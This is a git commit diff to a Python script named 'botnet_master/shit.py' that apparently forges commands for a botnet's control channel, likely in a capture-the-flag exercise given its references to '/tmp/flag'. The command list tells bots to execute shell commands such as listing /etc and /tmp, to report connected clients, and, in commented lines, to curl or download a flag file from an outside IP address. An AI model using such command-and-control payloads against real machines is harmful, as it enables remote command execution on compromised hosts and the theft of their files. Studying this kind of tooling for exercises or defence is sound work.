7c8d58c95d1c391fe731e5f3db790a216fa2d944
Petr Vaněk <pv@excello.cz>
2020-10-13 15:39:15 +0200

    update

--- botnet_master/shit.py
+++ botnet_master/shit.py
@@ -5,6 +5,7 @@ import base64
 import struct
 import socket
 import hashlib
+from time import sleep
 
 def encode(prefix, msg):
     out = prefix + msg
@@ -33,12 +34,19 @@ cmds = [
 #    ('kl5puyj43brf7iso', ';;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6'),
 #    ('kl5puyj43brf7iso', ';;wait;;*;;5' ), #944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb'),
 #    ('kl5puyj43brf7iso', ';;execute;;*;;ls'),
-    ('kl5puyj43brf7iso', ';;execute;;*;;ls -lha /tmp'),
+#    ('kl5puyj43brf7iso', ';;execute;;0000000000000000;;curl http://212.224.105.50:1234/flag'),
+    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;clients'),
+#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
+#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
+#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
+#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
+#    ('kl5puyj43brf7iso', ';;execute;;0000000000000000;;ls -lha /etc'),
+#    ('kl5puyj43brf7iso', ';;download;;0hpxc5sdo9kgne64;;/tmp/flag;;http://212.224.105.50:1234/flag')
 ]
 
-print('944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb')
-print(hashlib.sha384('kl5puyj43brf7iso;;wait;;*;;5'.encode('ascii')).hexdigest())
-print('---')
+#print('944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb')
+#print(hashlib.sha384('kl5puyj43brf7iso;;wait;;*;;5'.encode('ascii')).hexdigest())
+#print('---')
 #encode(cmds[1][0], cmds[1][1])
 
 for cmd in cmds:
